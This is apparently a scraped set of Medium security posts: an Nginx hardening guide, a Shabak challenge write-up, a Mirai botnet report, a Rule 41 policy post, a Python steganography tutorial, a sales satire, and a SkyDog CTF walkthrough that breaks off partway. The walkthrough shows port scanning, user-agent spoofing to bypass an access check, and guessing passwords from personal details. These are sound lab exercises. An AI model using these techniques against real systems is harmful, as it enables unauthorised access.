For this we will need to update the “/etc/apt/sources.list”, upgrade OpenSSL and install the Nginx server. Because Debian Jessie ships with OpenSSL v1.0.1 and for HTTP2 we need at least 1.0.2 then we must update the library to a newer version. To do that we will add the “sid” suite to the sources list and install openssl by specifying the suite.
Now running openssl version should return “OpenSSL 1.0.2e 3 Dec 2015”.
Or the same on Ubuntu 14.04
Let’s move on to installing Nginx. We have to add the Nginx package repository to the sources list so apt-get can find it. We’ll start by adding the nginx signing keys to our apt-get.
And then we’ll update the sources.list file
Or for Ubuntu 14.04
And now let’s install the newest Nginx
We can verify that our server is running by visiting the IP address/domain in the browser. We should see the Nginx welcome message. Now that we have set up our Nginx we need to configure it, however before we configure the proxy let’s obtain a SSL certificate using the default configuration.
One of the greatest innovations and ease of use improvements of last year was the emergence of Let’s Encrypt initiative. Let’s Encrypt is part of the HTTPS everywhere collective and it allows domain owners to quickly obtain SSL certificates for free. As of 2nd of December 2015 it is in public beta, so everyone can use it. So shall we to obtain a valid SSL cert.
This does require for you to have a valid domain name, that is pointing to this server instance. I will be using “example.com” in my examples.
In order to do that we’ll install the letsencrypt tool.  We’ll start in our home folder (/home/joe)
Next well use the letsencrypt-auto script to do everything for us. Since the support for Nginx is still very rough and buggy we’ll instead use the — webroot option to obtain our certificates. Nginx’s default webroot folder is “/usr/share/nginx/html” so we will use that.
This will ask for sudo permissions and install a bunch of dependencies for the client — can take quite a while.
After running this command you should see a message about recovery and that the certs have been obtained and where they are located. (Yes it really is that simple)
Now let’s move on to configuring our Proxy to use HTTPS and talk to our Node.js application.
In the last two sections we set up our Nginx server and obtained a SSL certificate which we can use to set up our secure web server. Not only will we be setting up our proxy and HTTPS, but we will also configure our Nginx to have more secure settings.
We will begin by creating a new stronger Diffie-Hellman key (the default is 1024, we’ll substitute with 4096)
Next we are going to remove our old default configuration file and create our own for our service.
The contents of the nginx configuration should be something like as follows:
Next we need to restart our Nginx service.
And now we can validate that everything is working by going to “http://example.com"" and seeing if it redirects to HTTPS and shows our “hello” message.
We can also visit SSL Labs website to verify that our SSL setup is secure — we should see something like:
We now have our service running using proper SSL and under low privileges. But we are not yet done there is still a bit to go — we are missing a firewall.
Currently we have no firewall setup. Our Node service is directly accessible from the web by specifying the port number. This also means that other services that we might install on the machine (like the database etc) will be open to the web.
This is not good from the security standpoint — so we will configure our firewall to only allow traffic in and out of our server that we have deemed fit.
In linux the firewall is configured using iptables. We will create the ruleset files and then import them to our iptables. The following configuration is just an example and not suitable for all servers.
Note: Do be careful when dealing with firewall — there is a good chance that you can lock yourself out of your instance if you do non-atomic updates on the settings. In DigitalOcean you can then use the console on the website to log in and fix the situation, but this is not the case in all hosting providers.
First we’ll create ‘/tmp/ip4’
With the following contents
Then we’ll create ‘/tmp/ip6’ and block all IPv6 traffic since I won’t be using it. If you want to support IPv6 traffic you need to modify the IPv4 configuration and configure the ip6tables.
Now that we have set up the rules it’s time to import them to our firewall configuration. We will first flush all previous  configuration that might be there and then import the new ones.
Now we have our firewall settings imported we can verify them using
However our firewall rules will be reset once we do a server restart. In order to have persistent firewall rules we need to  install iptables-persistent
This will ask if we want to save current rules, for which the answer is Yes.
Now we have set up our firewall we should remove the temporary files.
And all that is left is to verify that our site is accessible and if we try to access the service directly it will fail.
In this blog post we looked at how to configure our server from the ground up:
While this might seem like a lot there are quite a few things that we didn’t cover in this blog post:
However even these services aside our setup is now much more secure than simply copying our files onto a server and running sudo node app and be done with it.
This post is part of the Node.js Web Application Security Series. In this series of blog posts we will look at various topics of web application security and how they can be addressed in Node.js applications.
Knowledge about web security is something every decent web developer should know. Even if you are not security oriented the knowledge will help in designing more robust and secure systems, which in turn makes you a better developer overall.
On that note I recommend you buy and read my book “Secure Your Node.js Web Application”, which provides more in depth knowledge about Web Application Security and implementing security mechanisms in Node.js applications.
Originally published at nodeswat.com on February 15, 2016.
Edit to add OpenSSL and Nginx installation for Ubuntu 14.04
Written by
","['Nodejs', 'Cybersecurity', 'Security']"
Shabak Challenge - Part 1: Invitation - Danny Povolotski - Medium,https://medium.com/@stalkdanny/shabak-challenge-part-1-invitation-e2c13dd14121?source=tag_archive---------6-----------------------,"So today there has been some noise on various news websites about a new cyber challenge by the “Shabak” (The Israeli equivalent to the FBI).
It appears to be sort of a fun job application process, and since I love me a challenge, I’m going to try and solve the riddles and share the process with you.
So, when navigating to the ‘Cyber’ section on the new website, we’re greeted with a question: “Are you good enough?”. Am I? Are we? Let’s see…
The cryptic looking text under the challenging question seems to be a Base64 encoded string:
MTAxMDAxMTAxMTAxMDAwMDExMDAwMDEwMTEwMDAxMDAxMTAwMDAxMDExMDEwMTEuY29t
Thankfully, every browser comes with a developer console that among other things can decode strings encoded with Base64.
A quick conversion process leads us to the following website:http://10100110110100001100001011000100110000101101011.com/
I went ahead and clicked on “Homebase” (I’ll do Airplane next, if this thing stays up for long enough and I have time), which greeted me with the following story:
“Staff Sergeant Foxy” Managed to get his hands on secret source code from the intergalactic prison!unfortunately the code does not compile, Prove yourself worthy by compiling & executing the project.
Sounds interesting!
Downloading the first file (Homebase_1_can_you_code.rar) gets us a folder named “MakeMeCompile” with a broken Visual Studio project that doesn’t seem to compile.
The goal of this first step of the challenge seems to be figuring out if the contestants can accomplish some basic code cleanup tasks.
Without spoiling the whole thing, I’ll break apart the problem types we find in this challenge.
The first couple of problems have to do with two variables that seem to have their type declarations omitted. This is fairly straightforward — Visual Studio is kind enough to let us know the exact lines where the problem occurs, and all it takes to correct this one is knowing the right declaration syntax.
The second kind of problem has to do with function signatures.
Error C2556 ‘int *Encrypt(const BinaryBuffer &,const EncryptionKey &)’: overloaded function differs only by return type from ‘BinaryBuffer Encrypt(const BinaryBuffer &,const EncryptionKey &)’ MakeMeCompile c:\users\danny\downloads\homebase_1_can_you_code\makemecompile\encryption.cpp 11
The error looks a little bit confusing at first, but if you look carefully at the function definitions in Encryption.h and compare them with the declarations in Encryption.cpp you will immediately see that something doesn’t add up.
I guess this one might be a little silly to do for a national cyber security job, but come on — who hasn’t had that deadly typo that keeps you up for hours into the night or got lazy and copy pasted code forgetting to adjust the code to its’ new habitat.
If you look inside the Decrypt function you’ll see that the code looks like it has been copy pasted from Encrypt and one variable name was left behind in its’ original form.
It seems that line 37 in Encryption.cpp has been especially messed with. It contains a typo, and the method call isn’t quite right.
And finally, one last syntax error is on line 13, where the author is trying to change a const variable.
We’re done! Wait … are we? After pressing the Build button, we’re greeted with more errors from the linker.
I won’t spoil it all for you, but this last part has to do with the project compilation settings not matching the ones the TopSecretLib was compiled with. All I can say is that google is your best friend when it comes to this kind of stuff ;)
After fixing this last thing, all that is left is to build the project, run it in a console, and vualá!
Inputting the resulting password takes us to the next level.
This was an interesting challenge. If this interested you, subscribe and stay tuned for the next parts “Like a Boss” and “If so, we are looking for you” where we solve cryptographic challenges thrown at us by the Shabak intergalactic taskforce.
EDIT:Click here for Part 2 where we decrypt an encoded message from the next challenge:https://medium.com/@stalkdanny/shabak-challenge-part-2-like-a-boss-3a6d5991bcbc
If you’d like to work with me on real world challenges and problems, shoot me a line to:dannypovolotski@gmail.com
I also offer mentorship, consultation and assistance. You can check out my reviews on Codementor:
https://www.codementor.io/danny/
Written by
","['Programming', 'Cpp', 'Cybersecurity', 'Israel', 'Coding']"
"“Shadows Kill” — Mirai DDoS botnet testing large scale attacks, sending threatening messages about UK and attacking researchers",https://doublepulsar.com/shadows-kill-mirai-ddos-botnet-testing-large-scale-attacks-sending-threatening-messages-about-6a61553d1c7?source=tag_archive---------4-----------------------,"Mirai, a Denial of Service toolkit, is made up of lots of actors across botnets. The source code is open source, meaning anybody can download it and join the club.
After the historic DDoS attack which downed Dyn, in turn impacting DNS services to a very large number of websites, MalwareTech.com setup monitoring of Mirai botnets — introducing honeypots to monitor attack traffic.
The attacks are live tweeted as @MiraiAttacks
Many of the botnets are simply attacking Minecraft servers and doing technically terrible attacks on websites, e.g. a Farming Simulator game mod site.
We have seen a botnet called #14 attack significantly bigger targets. With monitoring it is clear they are extremely successful at attacking things. So far, these tests appear to be a test nature.
Transit providers confirm over 500gbit/sec of traffic is output during attacks. Attacks last a short period. It is the largest of the Mirai botnets and the domain controlling it pre-dates the attacks on Dyn. The capacity makes it one of the biggest DDoS botnets ever seen.
Over the past week we’ve seen continued short duration attacks on infrastructure in the nation of Liberia. Liberia has one internet cable, installed in 2011, which provides a single point of failure for internet access. From monitoring we can see websites hosted in country going offline during the attacks — additionally, a source in country at a Telco has confirmed to a journalist they are seeing intermittent internet connectivity, at times which directly match the attack. The attacks are extremely worrying because they suggest a Mirai operator who has enough capacity to seriously impact systems in a nation state.
Last night, while tweeting about the attacks, the botnet started sending messages:
It also attacked MalwareTech.com, which hosts @MiraiAttacks and who are performing the monitoring:
Additionally, a DNS flood was initiated, as picked up by a third party monitor:
While I was live tweeting about the issue, this message was sent via the botnet:
I am calling botnet #14 “Shadows Kill”, based on the message they sent.
As of 1PM today UK time, the botnet continues to intermittently attack Liberia telecom providers who co-own the submarine cable.
Monitoring is continuing of the botnet, but so far it appears they are testing denial of service techniques.
Written by
","['All Stories', 'Contact', 'Cybersecurity', 'Internet', 'Ddos', 'Mirai', 'Shadows Kill']"
Shaking My Head - Ron Wyden - Medium,https://medium.com/@RonWyden/shaking-my-head-5c1b60db9086?source=tag_archive---------0-----------------------,"Last month, at the request of the Department of Justice, the Courts approved changes to the obscure Rule 41 of the Federal Rules of Criminal Procedure, which governs search and seizure. By the nature of this obscure bureaucratic process, these rules become law unless Congress rejects the changes before December 1, 2016.
Today I, along with my colleagues Senators Paul from Kentucky, Baldwin from Wisconsin, and Daines and Tester from Montana, am introducing the Stopping Mass Hacking (SMH) Act (bill, summary), a bill to protect millions of law-abiding Americans from a massive expansion of government hacking and surveillance. Join the conversation with #SMHact.
For law enforcement to conduct a remote electronic search, they generally need to plant malware in — i.e. hack — a device. These rule changes will allow the government to search millions of computers with the warrant of a single judge. To me, that’s clearly a policy change that’s outside the scope of an “administrative change,” and it is something that Congress should consider. An agency with the record of the Justice Department shouldn’t be able to wave its arms and grant itself entirely new powers.
These changes say that if law enforcement doesn’t know where an electronic device is located, a magistrate judge will now have the the authority to issue a warrant to remotely search the device, anywhere in the world. While it may be appropriate to address the issue of allowing a remote electronic search for a device at an unknown location, Congress needs to consider what protections must be in place to protect Americans’ digital security and privacy. This is a new and uncertain area of law, so there needs to be full and careful debate. The ACLU has a thorough discussion of the Fourth Amendment ramifications and the technological questions at issue with these kinds of searches.
The second part of the change to Rule 41 would give a magistrate judge the authority to issue a single warrant that would authorize the search of an unlimited number — potentially thousands or millions — of devices, located anywhere in the world. These changes would dramatically expand the government’s hacking and surveillance authority. The American public should understand that these changes won’t just affect criminals: computer security experts and civil liberties advocates say the amendments would also dramatically expand the government’s ability to hack the electronic devices of law-abiding Americans if their devices were affected by a computer attack. Devices will be subject to search if their owners were victims of a botnet attack — so the government will be treating victims of hacking the same way they treat the perpetrators.
When the public realizes what is at stake, I think there is going to be a massive outcry: Americans will look at Congress and say, “What were you thinking?”
As the Center on Democracy and Technology has noted, there are approximately 500 million computers that fall under this rule. The public doesn’t know nearly enough about how law enforcement executes these hacks, and what risks these types of searches will pose. By compromising the computer’s system, the search might leave it open to other attackers or damage the computer they are searching.
Don’t take it from me that this will impact your security, read more from security researchers Steven Bellovin, Matt Blaze and Susan Landau.
Finally, these changes to Rule 41 would also give some types of electronic searches different, weaker notification requirements than physical searches. Under this new Rule, they are only required to make “reasonable efforts” to notify people that their computers were searched. This raises the possibility of the FBI hacking into a cyber attack victim’s computer and not telling them about it until afterward, if at all.
These changes are a major policy shift that will impact Americans’ digital security, expand the government’s surveillance powers and pose serious Fourth Amendment questions. Part of the problem is the simple fact that both the American public and security experts know so little about how the government goes about hacking a computer to search it. If a victim’s Fourth Amendment rights are violated, it might not be readily apparent because of the highly technical nature of the methods used to execute the warrant.
It is Congress’ job to make sure we do not let the Executive Branch run roughshod over our constituents’ rights. That is why action is so important: this is a policy question that should be debated by Congress. Although the Department of Justice has tried to describe this rule change as simply a matter of judicial venue, sometimes a difference in scale really is a difference in kind. By allowing so many searches with the order of just a single judge, Congress’s failure to act on this issue would be a disaster for law-abiding Americans.
When the public realizes what is at stake, I think there is going to be a massive outcry: Americans will look at Congress and say, “What were you thinking?”
Written by
","['Privacy', 'Congress', 'Cybersecurity']"
Simple Image Steganography in Python - HackerNoon.com - Medium,https://medium.com/hackernoon/simple-image-steganography-in-python-18c7b534854f?source=tag_archive---------8-----------------------,"In this post I’ll demonstrate how to achieve simple image steganography using Python. All digital file formats use internal structures and schemas, therefore unique implementations are required for different mediums, and often for different formats within those mediums.
Steganography is the art and science of concealing a message or file within a different, typically unrelated medium. Nowadays we think about concealing a message electronically within some other kind of digital file type. However the practice of steganography is not a recent development. Soldiers and spies have been using physical steganographic techniques for centuries if not longer.
Steganography is often linked to and discussed alongside cryptography, however the two are not mutually exclusive. One might use steganography in conjunction with encryption in order to deliver a secret message to a recipient without drawing attention to the fact that a message was sent at all. In essence using a combination of the two allows for a layered defense of secret communications.
In the digital age, steganography is increasingly being used by hackers and criminals to covertly communicate sensitive information. It is even being used as a means of bypassing network defenses to communicate with malware.
In steganography the payload is the data covertly communicated and the carrier is the signal, stream, or data file that hides the payload.
When it comes to digital images, specifically in regards to steganography, there are three primary classes. There file types are those with lossy-compression, those with lossless-compression, and raw file types. We will be working with lossless-compression file types. Lossless and lossy compressed files types are most common in the world today because of their compact size.
Of these, raw files are typically the easiest to work with. However they tend to be very large files, are not commonly used by most consumers, and often require special software used professional photographers or enthusiasts in order to view and edit. Some examples of raw image file formats are RAW and DNG.
Lossless-compression means that the files are stored in a compressed format, but that this compression does not result in the actual data being modified when the file is opened, transported, or decompressed. For lossless files steganography is often accomplished by manipulating the least-significant bits (LSB) of the carrier file. Some examples of lossless-compression image file formats are PNG, TIFF, an BMP.
Lossy-compression is the opposite of lossless-compression. When lossy compression is used there is no guarantee that the file will not be modified slightly when subjected to storage, transmission, or decompression. In nearly all cases this modification will be imperceptible to the end user, otherwise it wouldn’t be very popular. However, since LSB steganography will modify these “unimportant” bits that can be lost during compression doing steganography on files with lossy-compression is more complex. This means we can’t risk using lossy compression that may not preserve our modifications. Some examples of lossy-compression image file formats are JPEG and BPG.
So we’ve established that we will be working with LSB (least-significant bit) steganography and we will be limiting ourselves to using lossless image formats. This type of data hiding can be achieved using a variety of software languages and tools, however, I’ll be using python 3.6 and relying on the PIL library for our image support.
1. Set up a virtual environment (optional)This step is optional, though for clarity and keeping a clean development environment I would recommend you set up a virtual environment. I won’t cover how to do so in detail here, but you can use this documentation if you’re unfamiliar with the process.
2. Installing dependenciesAs I mentioned previously, we’ll be working with the PIL library. PIL can be installed using pip by running$ pip install pillow
If you’d rather, I’ll include my code here which will have a requirements.txt file you can use to install all dependencies. Additional requirements are binascii, random, and os. Though several of these are included libraries.
Now that we have our environment set up, we can start looking at the code.
Simply stated, LSB steganography works by encoding a secret message into the least-significant bit of each pixel in an image. In order to do this we need to do several things.
I’ll break down each step below.
1. Reading the carrier image.First we’ll create a new file which will container our image class and all necessary methods needed to do image handling. I’ve called this steg_img.py
Create an IMG class that will contain all our logic for reading and creating images.
Open the image using PIL and get some information such as the image type and size.
2. Confirm the carrier is large enough to fit the payload.
Because we may be working with different image file types with different modes, we need to check to make sure there is sufficient space to store the message within the carrier.
First we need to find the size of the payload in bits. We can use python os library for this and will multiple the result by 8, since we want the size in bits rather than bytes.
Next we will compare the payload size to the space available in the carrier. The space available will vary by image mode. Generally I treat RGB and RGBA images as having a capacity of 3 bits per pixel, while L mode images only have 1 bit per pixel. Just to be sure I can fit the buffers and any additional metadata I check to make sure the carrier’s capacity is at least 2x the size of the payload.
3. Convert the payload and buffers into binary data.
Next we’ll convert to binary and generate random binary data to fill in the rest of the image’s capacity. Once we add a few buffers that will be used for reconstruction, we will fill up the rest of the difference between the payload and carrier capacity with pseudorandom data.
5. Create a new image.
Now that we have our payload and buffers in binary we’re ready to create a new image that is a copy of the carrier image but with modified least significant bits on each color of each pixel. After we’ve created the new image it will simply be saved as new.<file_type> in the current directory.
You’ll see above that there’s a method from common.py called set_bit, this is where the actual magic of replacing the least significant bit of each color of each pixel takes place.
And there you have it! With a bit of python and the help of the PIL library you can start hiding secret messages in your images.
You can view my full code here or install the simple ‘steg’ library I wrote via pip by running$ pip install steg
In the future I may add some other fun capabilities to the library, like the ability to encrypt your payloads prior to hiding or add additional file formats for hiding. I’ve also added a command line tool to the repo above that will allow you to hide and extract payloads from the command line.
Written by
","['About', 'Help', 'Go Home', 'Cybersecurity', 'Steganography', 'Python', 'Image Steganography', 'Python Images']"
Sit On My Face And Tell That You Love Me - Not A Security Guru - Medium,https://medium.com/@talaarad/sit-on-my-face-and-tell-me-you-love-me-d8a7894b635c?source=tag_archive---------3-----------------------,"The phone to my left rings.
“RING RING”
Oh no, sorry. They don’t “ring ring” anymore. They do some modern “blingblingblignblingblign” or the “24” theme if you use Cisco VOIP.
“Blingblinglbingblingbling”
“Yes?”
(Footnote: I’ve been a security professional for many years. Worse, I’ve been a Mediterranean security professional for many years. That means two things: a. I suspect by default that you’re conducting a Social Engineering attack and so I’m not going to pick up and say HELLO YOU REACHED THE SECURITY DEPARTMENT, MAP YOUR ORGANIZATIONAL CHART ACCORDINGLY and b. I’m coming from a rude nation. I’m not going to say “at your service”. Not happening. End footnote).
“Hello sir, I am Philip from TotalDefenseSolutions (TM). And I’d like to make you an offer you cannot possibly refuse”.
“Yes?”
“I want you to sit on my face, and tell me that you love me”.
“Of course! Let me just put on my Sunday best”.
Ha Ha! I hear you all say. Absurd! I hear you all giggle. No self respecting salesman would ever do such a thing. And no self respecting security professional will ever put on his Sunday best and sit on someone’s face.
Is that so? Let’s take this to a real world scenario.
The Information Security Industry has been going through an unparalleled technological growth period in the last few years (see previous post about Steve’s disruption and contribution to this). The amount of companies with outstanding technology has grown exponentially, there are so much more tools available to stop the bad guys from doing bad guys’ stuff.
That also means that the amount of security sales personnel has grown. Much.
Now don’t get me wrong — as with any profession, there are some amazing sales people out there, that knows how to understand your need and how to match their technology to those needs, without making you want to shoot them in the process. And then, there are those who you want to sit on their face (and not declare your love in the process).
Now, some of you might say that selling to security professionals is not different to any other sales process. Well, yes and no. Yes, you still need to be a professional and a decent human being and know your product well. No, you’ll be selling your products to a bunch of cynical, paranoid, underpaid, overworked, uber migrained people, who have not seen the light of day for years. They are not your friends.
Do not call from a blocked number.
How shall I put this? you’re calling a paranoid individual who would suspect his own mother is trying to get his admin credentials. And you’re calling him from a blocked number? You think this is a smart? I for one (and I believe many other security people as well) very rarely answer a phone from a blocked number and only if you catch me distracted or drunk.
Do not ask me about my security strategy
Seriously, you’re a voice on the phone. I don’t know you. I probably don’t want to know you. You are calling from a blocked number. Naturally, I’ll be very keen to tell you about my strategy. Or the recent vulnerabilities on my website. Maybe you want me to click on a link while you’re at it?
Security strategy is a legitimate question to ask, as it pertains to your solutions and only after some relationship (and hopefully a Non Disclosure Agreement!) has been established. Before that, I’m happy to tell you my name, rank and favorite whisky blend.
Do check if your company has already working relationship with us before cold-calling. Yes, I understand different regions may compete against each other. No I do not accept the fact that you didn’t check your salesforce record before calling. If you call and ask me if I ever heard of your solution while I’m doing multi-million business with your company for the last five years, well, you’re a lazy sod.
Do not tell me you give me 100% protection. Do not use the words unparalleled/the only one that/complete protection or the word HOLISTIC in any shape or form. There is no complete protection. There is no 100%. There is no technology out there that cannot be foiled/bypassed/hacked/drowned in a bucket full of custard. Anyone claiming that his solution gives full coverage is a charlatan or just doesn’t understand what they sell. There are amazing technologies out there and there are excellent people behind these technologies. Non of them gives “complete” security.
Seriously, don’t use the word HOLISTIC.
Do not call everyone in the company that has “security” written somewhere in his/her title. Now, this is generally a good idea not to call someone in a company if you want to sell him something, and in parallel call his manager, his managers’ manager and five of his subordinates. They meet up for lunch every now and then and you could end up having this conversation:
Person a: Hey, I’ve been contacted by TotalDefenseSolutions (TM) they seem like cool guys, maybe we should talk to them?
Manager: really? they called me as well.
Managers’ Manager: really? they called me as well?
Five subordinates in unison: REALLY? THEY CALLED US AS WELL?
Person: they’re arses, let’s not work with them.
The above is a good practice for any salesperson, but it’s even more important when you deal with security paranoids. Remember calling from blocked number? What do you think the above security people will think when they’re contacted all in the same time by someone offering to sell them TotalDefenseSolutions (TM)? Yes! let’s all sing it together: SOCIAL ENGINEERING!
Don’t do it.
Do your homework before you do cold-calling. As a general rule cold calling annoys me, but I realize this is something that the industry (or any industry) can’t eliminate. However, if you must do cold calling, try to check who it is you’re talking with and what his interests may be. Try to avoid the following conversations:
Hello, is this Mr. Not Guru?
Yes, speaking.
Hello, I’m Philip from TotalDefenseSolutions (TM). I believe you are? (papers rustling) the head of corporate plumbing?
No.
Oh sorry? (papers rustling frantically) are you the head of the network degradation department?
No.
Sorry (papers dropping like dry leaves) are you the Principal Architect for the Bring Your Own Disaster Progrm?
*Click*
Bonus: don’t send the same introduction email seven times over saying “you probably didn’t have the time to read my previous email so I’m sending it again”. If I haven’t answered the six previous ones, I’m probably not going to answer this one again. Remember, I’m paranoid and unpleasant.
In summary: it’s a tough world for salespeople, and it’s not easy finding a way into any organization without previous connection, in any industry. But it’s even more tough when you’re dealing with the happy security bunch. Adjust your behavior accordingly and always assume the worse. If you see the world like we do, we might dislike you just a little bit less than the next guy. (*)
(*)If you managed to understand this tripple negative, congratulations, you’re hired.
Written by
","['Sales', 'Information Security', 'Cybersecurity']"
SkyDog 2016 Catch Me If You Can VM — Vulnhub.com - Andrew Hilton - Medium,https://medium.com/@andr3w_hilton/skydog-2016-catch-me-if-you-can-vm-vulnhub-com-2a4aa4aea4ce?source=tag_archive---------6-----------------------,"So this is the first one of these that I’ve done in quiet a few months. Please bare with me as this might be a slow process as I get back into it haha.
You can download the VM from here, I had a great time working through it.
Lets get into it.
So after a default Netdiscover scan I get the IP as 192.168.1.155
Lets see what we can find from an nmap scan  [root@parrot]─[/home/andrew]└──╼ #nmap -p- -A 192.168.1.155
So we can see from the above scan command that ports
22/tcp closed ssh80/tcp open http443/tcp open https22222/tcp open easyengine
are on the system. A standard 80 is open so lets fire up firefox and see what the website has on it.
On first viewing the website there is nothing that jumps out straight away. I’ll come back to the website in a bit.
Let’s check out the ssh port 22222
[root@parrot]─[/home/andrew]└──╼ #ssh -p 22222 192.168.1.155The authenticity of host ‘[192.168.1.155]:22222 ([192.168.1.155]:22222)’ can’t be established.ECDSA key fingerprint is SHA256:DeCMZ74o5wesBHFLyaVY7UTCA7mW+bx6WroHm6AgMqU.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added ‘[192.168.1.155]:22222’ (ECDSA) to the list of known hosts.# WARNING ########################## FBI — Authorized access only! # # Disconnect IMMEDIATELY if you are not an authorized user!!! ## All actions Will be monitored and recorded ## Flag{53c82eba31f6d416f331de9162ebe997} ##################################
Cool, there’s the first flag
Flag{53c82eba31f6d416f331de9162ebe997}
Lets run it through crackstation and see what that hash decrypts as.
53c82eba31f6d416f331de9162ebe997 md5 encrypt
So the flag is “encrypt” I have no idea what to do with that at the moment. I’ll make a note of it in case I need to come back to it later.
Lets go back to the website and do a deeper dive on it. Looking at the source code there doesn’t seem to be much going on, one comment does seem out of place though
<! — [If IE4]><script src=”/oldIE/html5.js”></script><![Make sure to remove this before going to PROD] →
Viewing the directory I can see it’s a huge dump of what look likes obfuscated javascript. The first line though seems like a hash of some kind.
666c61677b37633031333230373061306566373164353432363633653964633166356465657d
Running it through crackstation though doesnt return anything useful, at this point I was stuck for while not really knowing what to do next. It was only after rereading the flag clues that I noticed the first one was
Don’t go Home Frank! There’s a Hex on Your House.
So maybe that string isn’t a hash but a hexidecimal string, heading over to asciitohex.com i can try to convert it.
Bingo!! it comes back as
flag{7c0132070a0ef71d542663e9dc1f5dee} cool, so now heading back over to crackstaion and decrypting the hash value gives me
7c0132070a0ef71d542663e9dc1f5dee md5 nmap
Cool, so I’ve found two flags but I think I’ve found them in the wrong order as the one I just found (2nd) decrypts as “nmap” which I think is a clue to head back to nmap and do another scan to find the non standard ssh service running on port 22222. Which would lead me to the ssh flag and get the word “encrypt”
Ok so the clue for flag 3 is “Be Careful Agent, Frank Has Been Known to Intercept Traffic Our Traffic” after a little googling I came across a website that said about traffic intercepting via invalid SSL certificates. So I am going to start my search with the SSL cert.
Loading the webpage in firefox and then adding an exception for the invalid cert allows me to view the contents and there is it the third flag.
flag3{f82366a9ddc064585d54e3f78bde3221} taking it over to crack station and it decrypts as
f82366a9ddc064585d54e3f78bde3221 md5 personnel
Ok so the next clue is “personnel” maybe it’s another directory on the website. Back in Firefox and I can see
192.168.1.155/personnel is a valid directory but I’m not authorised to view it as I’m not coming from an FBI Workstation.
Ok so how can I make it think I’m coming from an FBI workstation, viewing the source doesn’t give me anything useful at all. After lots of Googling and trying to get a foot hold on anything useful and failing. I decide to go back through my notes and look for anything I can use. The only other real piece of useful info I have so far is that huge Javascript dump from the first flag.
After trawling through the dump there were two lines that stuck out.
/* maindev — 6/7/02 Adding temporary support for IE4 FBI Workstations *//* newmaindev — 5/22/16 Last maindev was and idoit and IE4 is still Gold image -@Support doug.perterson@fbi.gov */
This looks like a goldmine. First we have the user agent profile needed to access the site from an FBI workstation but also the second line gives us an email address for support. We can use this address possibly as a username elsewhere in the VM.
Doug Perterson
So now I need to change my UA string to allow us to appear to be connecting through an IE4 browser. So after a quick Google search to find out what the string is meant to contain (as the default downloadable list only goes back to IE5.5) I came across this website http://www.useragentstring.com/pages/useragentstring.php?name=Internet+Explorer which allowed me to add a new string
Now I can test the UA string once it has been changed by selecting it and reloading the page.
BINGO!!! It worked and now the page give us this:
And as another bonus of gaining access to the page the 4th flag is there too.
flag{14e10d570047667f904261e6d08f520f}
So lets see how that decrypts on crackstation, it decrypts as
14e10d570047667f904261e6d08f520f md5 evidence
Just below the flag on the FBI portal is another clue
So reading it literally, it gives me Clue=newevidence. I dont really understand what that wants me to do at the moment so lets look at the clue from the fifth flag which is
The Devil is in the Details — Or is it Dialogue? Either Way, if it’s Simple, Guessable, or Personal it Goes Against Best Practices
There are a few more interesting parts to the FBI Portal the first is
An Unordered List
Chase Manhattan Bank Dr. Frank Conners France July 16, 2009. Great American Masterpiece. Heidelberg or Man
and then the second is
An Ordered List
France Dr. Frank Conners Chase Bank Heidelbery Miami Sixty-one on 7/4/6008
I’m sure this is really important but I’m not sure how right now. I have entered all of into my working notes and I’ll come back to it when I get stuck again.
So on the off chance that the clue was another directory to be searched I checked out 192.168.1.155/newevidence and got to a pop up window that needs authentication. I’m guessing this is the next step
I can see that the Personnel page has us logged in as an Agent Hanratty, a quick Google search of the name gives me his first name as Carl. Ok so how are the usernames formatted, I spent way too long thinking about this until I remembered the support email from the JS dump @Support doug.perterson@fbi.gov
It looks like the naming convention is firstname.lastname so using that with the info we have so far I get
carl.hanratty cool so what can the password be, the clue hints at it being Simple, Guessable, or Personal. It also mentions Dialogue in the clue. So I’m thinking it’s something to do with the characters dialogue in the film. Lets head over to IMDB and see if we can find out any simple/personal info. http://www.imdb.com/character/ch0004040/bio
After trying a lot of wrong passwords using details from IMDB and dialogue from the film I tried the name Grace (Carls daughters name) he says it in the line “She was four when I left. Now she’s 15. My wife’s been remarried for 11 years. I see Grace every now and again.”
Bingo, I’m in.
So lets take a look around the site and see if we can find the flag, I’m going to start looking in the possible locations link. Which contains this picture
Let’s download it and run some exiftools on it to see if there’s anything in the metadata
Running it through exiftool, identify and strings didn’t return anything useful at all. Ok so back to the drawing board, I could probably use a reverse Google image lookup to find the actual location in the image but I wont get the flag from that, so what am I missing?
Lets go back and check out the rest of the links on the webpage. Clicking the Evidence Summary File link and there it is another flag string haha, I should have just clicked on that before falling down the exif rabbit hole. Ok so like the others lets see what it decrypts to.
flag{117c240d49f54096413dd64280399ea9} becomes117c240d49f54096413dd64280399ea9 md5 panam
Cool so the next clue has something to do with Panam (the airline company featured in the film).
Let’s move onto the next flag no.6 the clue is “Where in the world is Frank” I’m thinking its got something to do with the picture I found a minute ago, so I’m going to have to go back and hit it again.
Whilst I’m on the site let’s see what the last link has to offer. It contains 1 invoice from a company called Hetzl and Associates They are invoicing an Agent Earl Amdursky for an encryption consultation project.
Cool I’ll save this to my working notes file and also make a note of the agents name, as this gives me another user should I need it.
So still no real leads on flag 6 so it’s back to the image file, running a ls -la command on the dir I can see that the image file is 4.2mb, thats not huge but it does seem weird, I’m nearly 100% sure this has something else going on in it, I just dont know how to find it. Lets go back to google and see if I can find another Stego app that I can use to scan the image with.
Googling the term steg app kali and clicking on the first link brings me to an app called steghide
http://steghide.sourceforge.net/
What’s really interesting here is at the bottom of the page the authors name is Stefan Hetzl, that second name sounds familiar right?!
It was the name of the person sending the encryption invoice from earlier, so now I know I’m on the right path. Steghide is built into kali linux so a quick command of
┌─[root@parrot]─[/home/andrew/Desktop]└──╼ #steghide — extract -sf image.jpg Enter passphrase:
and I hit another wall, haha ok. It only took a few seconds of going back through my notes to remember flag 5 decrypted as panam so I tried that as the password and it worked :-)
─[root@parrot]─[/home/andrew/Desktop]└──╼ #steghide — extract -sf image.jpg Enter passphrase: wrote extracted data to “flag.txt”.
It dumped a flag.txt file into the directory and opening the flag file gave me the next flag and a clue
flag{d1e5146b171928731385eb7ea38c37b8}=ILoveFrance
clue=iheartbrenda
The flag decrypts as d1e5146b171928731385eb7ea38c37b8 Unknown Not found. (That’s really strange that it isnt a real hash) Hmmm ok I’ll make a note of it and then come back it if I need to.
We also have the clues =ILoveFrance and clue=iheartbrenda
A Google search confirms Brenda is another character from the film. Brenda Strong is Franks girlfriend. Ok noted and lets move on.
Trying /iheartbrenda as a dir doesnt return anything neither does the same but with /ILoveFrance so what is the clue telling me to do??
